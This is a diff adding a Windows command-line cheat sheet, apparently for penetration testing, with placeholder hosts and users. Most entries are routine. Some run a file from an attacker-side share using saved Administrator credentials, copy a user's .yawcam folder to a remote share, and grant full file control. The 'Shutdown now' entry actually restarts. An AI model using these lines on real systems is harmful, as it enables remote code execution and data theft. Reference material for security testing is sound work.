@@ -1,0 +1,58 @@
+# desc: Get current dir
+cd 
+
+# desc: Change dir
+cd C:\path\to\dir 
+
+# desc: List current dir
+dir 
+
+# desc: List hidden files
+dir /a:h C:\path\to\dir 
+
+# desc: Recursive list without shit
+dir /s /b 
+
+# desc: Get current time
+time 
+
+# desc: Get current date
+date 
+
+# desc: Shutdown now
+shutdown /r /t 0 
+
+# desc: Cat file
+type #{file}
+
+
+# desc: Runas
+runas /savecred /user:WORKGROUP\Administrator "\\#{LHOST}\#{file}" 
+
+# desc: Use saved credentials
+# The password will be prompted
+runas /netonly /user:#{DOMAIN}\#{USER} "cmd.exe" 
+
+
+# Hide
+# desc: Set Hidden
+attrib +h file 
+
+# Hide
+# desc: Quit Hidden
+attrib -h file 
+
+
+# desc: Give full control over a file that you owns
+icacls #{file} /t /e /p #{USER}:F
+
+# desc: Remove the permision
+icacls #{file} /e /r #{USER}
+
+
+# desc: Recursive copy to smb
+xcopy /hievry C:\Users\security\.yawcam \\#{RHOST}\name\win
+
+# desc: Change language to English
+# chinese code page is 936
+chcp 437
